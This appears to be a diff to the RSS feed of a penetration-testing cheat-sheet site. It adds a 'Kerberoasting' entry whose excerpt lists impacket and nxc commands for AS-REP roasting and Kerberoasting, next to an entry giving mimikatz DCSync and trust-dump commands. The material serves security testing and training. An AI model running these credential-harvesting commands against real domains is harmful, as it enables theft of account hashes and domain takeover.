@@ -15,6 +15,13 @@
       <description>Privesc from DA (Domain Admin) to EA (Enterprise Admin) Windows 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * # Returns a list of trusted domains nltest /domain_trusts # Gets a collection of the trust relationships of the current forest ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID .\mimikatz.exe &amp;#39;lsadump::trust&amp;#39; &amp;#39;exit&amp;#39; 3. Get krbtgt hash of current domain .\mimikatz.exe &amp;#39;lsadump::dcsync /all /csv&amp;#39; &amp;#39;exit&amp;#39; 4.</description>
     </item>
     <item>
+      <title>Kerberoasting</title>
+      <link>https://tldrbins.github.io/roasting/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/roasting/</guid>
+      <description>AS_REP Roasting Impacket nxc # Multiple valid usernames impacket-GetNPUsers &amp;lt;DOMAIN&amp;gt;/ -usersfile &amp;lt;USERS_FILE&amp;gt; -no-pass -dc-ip &amp;lt;DC&amp;gt; # Single user without creds impacket-GetNPUsers -no-pass -dc-ip &amp;lt;TARGET&amp;gt; &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt; # Multiple valid usernames nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;lt;USERS_FILE&amp;gt; -p &amp;#39;&amp;#39; --asreproast as_rep_hashes.txt Kerberoasting (From Linux) Impacket nxc # Fix time skew sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs -request &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; Note: Times skew have to be within 5 minutes in kerberos&#xA;# Kerberoasting without cred sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs -no-preauth &amp;lt;USER_WITH_DONT_REQUIRE_PREAUTH&amp;gt; -usersfile &amp;lt;USERS_FILE&amp;gt; -dc-host &amp;lt;DC_IP&amp;gt; &amp;lt;DOMAIN&amp;gt;/ nxc ldap &amp;lt;DC_IP&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --kerberoasting kerberoast_hashes.</description>
+    </item>
+    <item>
       <title>Kerberos</title>
       <link>https://tldrbins.github.io/kerberos/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
